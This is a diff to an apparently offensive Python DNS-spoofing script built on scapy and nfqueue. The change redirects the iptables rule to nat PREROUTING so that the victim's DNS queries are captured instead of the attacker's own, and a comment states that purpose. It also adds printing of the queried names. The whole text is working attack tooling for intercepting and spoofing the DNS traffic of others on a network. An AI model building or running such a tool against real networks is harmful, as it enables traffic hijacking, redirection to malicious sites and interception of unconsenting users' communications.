@@ -13,7 +13,6 @@ import os
 parser = argparse.ArgumentParser()
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
 args = parser.parse_args()
-
 localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 
 def cb(payload):
@@ -22,8 +21,9 @@ def cb(payload):
 	ip_layer = pkt[IP]
 	dns_layer = pkt[DNS]
 	if not pkt.haslayer(DNSQR):
-		payload.set_verdict(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
+		payload.set_verdict(nfqueue.NF_ACCEPT)
 	else:
+		print pkt[DNS].qd.qname
 		if args.dnsspoof in pkt[DNS].qd.qname:
 			print '[+] DNS request for %s found' % args.dnsspoof
 			payload.set_verdict(nfqueue.NF_DROP)
@@ -34,7 +34,8 @@ def cb(payload):
 
 def main():
 	print '[*] Setting up iptables and starting the queue'
-	os.system('iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE')
+#	iptables -A OUTPUT just catches packets on the attacker's machine, -t nat -A PREROUTING just catches the victim
+	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
 	q = nfqueue.queue()
 	q.open()
 	q.bind(socket.AF_INET)
